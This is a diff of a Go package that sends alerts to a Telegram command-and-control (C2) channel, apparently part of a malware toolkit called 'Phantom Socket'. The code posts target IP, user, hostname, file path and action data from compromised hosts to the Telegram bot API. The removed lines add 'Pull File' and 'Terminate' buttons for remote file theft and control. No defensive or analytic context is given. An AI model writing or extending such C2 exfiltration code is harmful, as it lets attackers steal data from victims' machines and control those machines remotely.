@@ -1,4 +1,4 @@
-// Package telegram - Advanced Telegram alerting for Soket.io V1.0 infrastructure.
+// Package telegram - Telegram alerting for Phantom Socket infrastructure.
 package telegram
 
 import (
@@ -29,7 +29,7 @@ type AlertData struct {
 	Details   string
 }
 
-// SendAlert sends a highly structured HTML report to the Telegram C2.
+// SendAlert sends a structured HTML report to the Telegram C2.
 func SendAlert(data AlertData) error {
 	if botToken == "" || chatID == "" {
 		return fmt.Errorf("telegram configuration missing")
@@ -38,16 +38,16 @@ func SendAlert(data AlertData) error {
 	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
 
 	report := fmt.Sprintf(
-		"<b>SYSTEM ALERT: [%s]</b>\n"+
+		"<b>PHANTOM ALERT: %s</b>\n"+
 			"----------------------------\n"+
-			"<b>TARGET IP :</b> <code>%s</code>\n"+
-			"<b>USER      :</b> <code>%s</code>\n"+
-			"<b>HOSTNAME  :</b> <code>%s</code>\n"+
-			"<b>ACTION    :</b> <b>%s</b>\n"+
-			"<b>PATH      :</b> <code>%s</code>\n"+
-			"<b>TIMESTAMP :</b> <code>%s</code>\n"+
+			"TARGET IP : <code>%s</code>\n"+
+			"USER      : <code>%s</code>\n"+
+			"HOSTNAME  : <code>%s</code>\n"+
+			"ACTION    : %s\n"+
+			"PATH      : <code>%s</code>\n"+
+			"TIMESTAMP : <code>%s</code>\n"+
 			"----------------------------\n"+
-			"<b>INFO      :</b> %s",
+			"INFO      : %s",
 		data.EventType,
 		data.IP,
 		data.User,
@@ -63,12 +63,6 @@ func SendAlert(data AlertData) error {
 	vals.Set("text", report)
 	vals.Set("parse_mode", "HTML")
 	vals.Set("disable_web_page_preview", "true")
-
-	// Add Interactive Buttons
-	if data.FilePath != "" && data.FilePath != "N/A" {
-		keyboard := fmt.Sprintf(`{"inline_keyboard": [[{"text": "Pull File", "callback_data": "pull:%s"}, {"text": "Terminate", "callback_data": "term"}]]}`, data.FilePath)
-		vals.Set("reply_markup", keyboard)
-	}
 
 	client := &http.Client{Timeout: 15 * time.Second}
 	resp, err := client.PostForm(apiURL, vals)
